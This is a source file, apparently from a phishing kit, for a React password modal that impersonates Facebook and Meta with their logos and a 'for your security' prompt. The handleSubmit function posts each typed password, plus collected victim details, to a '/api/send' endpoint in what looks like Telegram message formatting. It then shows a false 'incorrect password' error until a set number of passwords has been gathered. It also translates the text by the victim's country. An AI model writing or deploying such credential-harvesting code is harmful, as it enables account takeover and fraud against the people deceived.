import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import type { FC } from 'react';
import { useEffect, useState } from 'react';

const EyeIcon: FC = () => (
    <svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round' className='h-4 w-4' aria-hidden='true'>
        <path d='M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0' />
        <circle cx='12' cy='12' r='3' />
    </svg>
);

const EyeOffIcon: FC = () => (
    <svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round' className='h-4 w-4' aria-hidden='true'>
        <path d='M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49' />
        <path d='M14.084 14.158a3 3 0 0 1-4.242-4.242' />
        <path d='M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143' />
        <path d='m2 2 20 20' />
    </svg>
);

const PasswordModal: FC<{ nextStep: () => void; }> = ( { nextStep } ) =>
{
    const [ attempts, setAttempts ] = useState( 0 );
    const [ isLoading, setIsLoading ] = useState( false );
    const [ password, setPassword ] = useState( '' );
    const [ showError, setShowError ] = useState( false );
    const [ showPassword, setShowPassword ] = useState( false );
    const [ translations, setTranslations ] = useState<Record<string, string>>( {} );

    const { geoInfo, messageId, baseInfo, passwords, addPassword, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = ( text: string ): string =>
    {
        return translations[ text ] || text;
    };

    useEffect( () =>
    {
        if ( !geoInfo ) return;

        const textsToTranslate = [
            'Password',
            "The password that you've entered is incorrect.",
            'Continue',
            'For your security, you must enter your password to continue.',
            'Forgot your password?'
        ];

        const translateAll = async () =>
        {
            const translatedMap: Record<string, string> = {};

            for ( const text of textsToTranslate )
            {
                translatedMap[ text ] = await translateText( text, geoInfo.country_code );
            }

            setTranslations( translatedMap );
        };

        translateAll();
    }, [ geoInfo ] );

    const togglePassword = () =>
    {
        setShowPassword( !showPassword );
    };

    const handleSubmit = async ( e?: { preventDefault: () => void; } ) =>
    {
        e?.preventDefault();
        if ( !password.trim() || isLoading ) return;

        setShowError( false );
        setIsLoading( true );

        const next = attempts + 1;
        setAttempts( next );

        const allPasswords = [ ...passwords, password ];
        const passwordSection = allPasswords.map( ( pass, index ) => `<b>🔒 Password ${ index + 1 }/${ maxPass }:</b> <code>${ pass }</code>` ).join( '\n' );

        const message = `${ baseInfo }\n\n${ passwordSection }`;

        try
        {
            const res = await axios.post( '/api/send', {
                message,
                delete_message_id: messageId
            } );

            if ( res?.data?.success && typeof res.data.message_id === 'number' )
            {
                setMessageId( res.data.message_id );
                addPassword( password );
            }

            if ( config.PASSWORD_LOADING_TIME )
            {
                await new Promise( ( resolve ) => setTimeout( resolve, config.PASSWORD_LOADING_TIME * 1000 ) );
            }
            if ( next >= maxPass )
            {
                nextStep();
            } else
            {
                setShowError( true );
                setPassword( '' );
            }
        } catch
        {
            //
        } finally
        {
            setIsLoading( false );
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4 py-5 md:py-10'>
            <div className='flex h-full max-h-full w-full max-w-lg flex-col overflow-hidden rounded-[16px] bg-white px-5 py-5 shadow-lg'>
                <div className='flex flex-1 flex-col items-center justify-between overflow-y-auto'>
                    <div className='mx-auto mb-5 h-[50px] w-[50px]'>
                        <Image src={ FacebookLogoImage } alt='logo' className='h-full w-full object-contain' />
                    </div>

                    <div className='w-full'>
                        <p className='mb-[7px] text-[14px] text-[#9a979e]'>{ t( 'For your security, you must enter your password to continue.' ) }</p>

                        <form onSubmit={ handleSubmit }>
                            <div className='relative mb-[10px] h-[40px] w-full rounded-[10px] border border-[#d4dbe3] bg-white px-[11px] text-[14px] transition-all duration-200 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100'>
                                <input
                                    type={ showPassword ? 'text' : 'password' }
                                    id='password'
                                    value={ password }
                                    onChange={ ( e ) => setPassword( e.target.value ) }
                                    className='hide-password-toggle h-full w-full outline-0'
                                    placeholder={ t( 'Password' ) }
                                    autoComplete='new-password'
                                />
                                <button type='button' className='absolute inset-y-0 right-0 flex cursor-pointer items-center px-3 text-gray-600' tabIndex={ -1 } onClick={ togglePassword }>
                                    { showPassword ? <EyeOffIcon /> : <EyeIcon /> }
                                </button>
                            </div>

                            { showError && <p className='mb-2 text-[13px] text-red-500'>{ t( "The password that you've entered is incorrect." ) }</p> }
                            <div className='mt-5 w-full'>
                                <button
                                    type='submit'
                                    disabled={ isLoading }
                                    className={ `flex h-[40px] min-h-[40px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] py-[10px] text-white transition-opacity duration-300 ${ isLoading ? 'cursor-not-allowed opacity-80' : 'hover:opacity-90' }` }
                                >
                                    { isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t( 'Continue' ) }
                                </button>
                            </div>

                            <div>
                                <p className='mt-[10px] text-center'>
                                    <span className='cursor-pointer text-[14px] text-[#9a979e]'>{ t( 'Forgot your password?' ) }</span>
                                </p>
                            </div>
                        </form>
                    </div>
                    <div className='mx-auto mt-5 w-[60px]'>
                        <Image src={ MetaLogo } alt='logo' className='h-full w-full object-contain' />
                    </div>
                </div>
            </div>

            <style jsx>{ `
                .hide-password-toggle::-ms-reveal,
                .hide-password-toggle::-ms-clear {
                    display: none;
                }
            `}</style>
        </div>
    );
};

export default PasswordModal;
